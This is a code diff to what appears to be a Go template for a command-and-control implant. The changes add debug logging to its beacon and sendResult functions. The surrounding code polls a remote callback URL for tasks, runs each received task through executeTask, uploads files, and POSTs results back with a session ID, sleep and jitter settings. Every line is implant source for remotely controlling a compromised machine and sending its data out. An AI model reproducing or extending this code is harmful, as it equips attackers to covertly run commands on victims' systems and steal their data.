@@ -702,6 +702,7 @@ func sleepMask(duration time.Duration) {
 func beacon() {
 	{{if .Debug}}
 	fmt.Println("[DEBUG] Sending beacon request...")
+	fmt.Printf("[DEBUG] Request URL: %s/beacon\n", callbackURL)
 	{{end}}
 	
 	client := &http.Client{
@@ -732,6 +733,10 @@ func beacon() {
 	}
 	sessionMu.Unlock()
 	
+	{{if .Debug}}
+	fmt.Printf("[DEBUG] Request headers: User-Agent=%s, X-Session-ID=%s\n", userAgent, req.Header.Get("X-Session-ID"))
+	{{end}}
+	
 	resp, err := client.Do(req)
 	if err != nil {
 		{{if .Debug}}
@@ -743,6 +748,7 @@ func beacon() {
 	
 	{{if .Debug}}
 	fmt.Printf("[DEBUG] Beacon response status: %d\n", resp.StatusCode)
+	fmt.Printf("[DEBUG] Response headers: %v\n", resp.Header)
 	{{end}}
 	
 	// Handle commands
@@ -754,6 +760,10 @@ func beacon() {
 			{{end}}
 			return
 		}
+		
+		{{if .Debug}}
+		fmt.Printf("[DEBUG] Response body: %+v\n", response)
+		{{end}}
 		
 		// Store session ID from response
 		if sid, ok := response["session_id"].(string); ok && sid != "" {
@@ -773,12 +783,27 @@ func beacon() {
 		if tasks, ok := response["tasks"].([]interface{}); ok {
 			{{if .Debug}}
 			fmt.Printf("[DEBUG] Received %d tasks\n", len(tasks))
+			for i, task := range tasks {
+				fmt.Printf("[DEBUG] Task %d: %+v\n", i, task)
+			}
 			{{end}}
 			for _, task := range tasks {
 				if taskMap, ok := task.(map[string]interface{}); ok {
 					executeTask(taskMap)
 				}
 			}
+		}
+		
+		if sleep, ok := response["sleep"].(float64); ok {
+			{{if .Debug}}
+			fmt.Printf("[DEBUG] Server sleep interval: %.2f seconds\n", sleep)
+			{{end}}
+		}
+		
+		if jitter, ok := response["jitter"].(float64); ok {
+			{{if .Debug}}
+			fmt.Printf("[DEBUG] Server jitter: %.2f%%\n", jitter*100)
+			{{end}}
 		}
 	} else {
 		{{if .Debug}}
@@ -899,6 +924,7 @@ func uploadFile(path, data string) {
 func sendResult(taskType, taskID, result string) {
 	{{if .Debug}}
 	fmt.Printf("[DEBUG] Sending result for task: %s (type: %s)\n", taskID, taskType)
+	fmt.Printf("[DEBUG] Result URL: %s/result\n", callbackURL)
 	{{end}}
 	
 	client := &http.Client{Timeout: 10 * time.Second}
@@ -915,6 +941,10 @@ func sendResult(taskType, taskID, result string) {
 		return
 	}
 	
+	{{if .Debug}}
+	fmt.Printf("[DEBUG] Payload JSON: %s\n", string(jsonData))
+	{{end}}
+	
 	req, err := http.NewRequest("POST", callbackURL+"/result", bytes.NewReader(jsonData))
 	if err != nil {
 		{{if .Debug}}
@@ -930,6 +960,13 @@ func sendResult(taskType, taskID, result string) {
 	sessionMu.Lock()
 	if sessionID != "" {
 		req.Header.Set("X-Session-ID", sessionID)
+		{{if .Debug}}
+		fmt.Printf("[DEBUG] Request headers: User-Agent=%s, Content-Type=application/json, X-Session-ID=%s\n", userAgent, sessionID)
+		{{end}}
+	} else {
+		{{if .Debug}}
+		fmt.Println("[DEBUG] WARNING: No session ID available for result request")
+		{{end}}
 	}
 	sessionMu.Unlock()
 	
@@ -943,7 +980,8 @@ func sendResult(taskType, taskID, result string) {
 	defer resp.Body.Close()
 	
 	{{if .Debug}}
-	fmt.Printf("[DEBUG] Result sent successfully (status: %d)\n", resp.StatusCode)
+	fmt.Printf("[DEBUG] Result response status: %d\n", resp.StatusCode)
+	fmt.Printf("[DEBUG] Result response headers: %v\n", resp.Header)
 	{{end}}
 }
 `
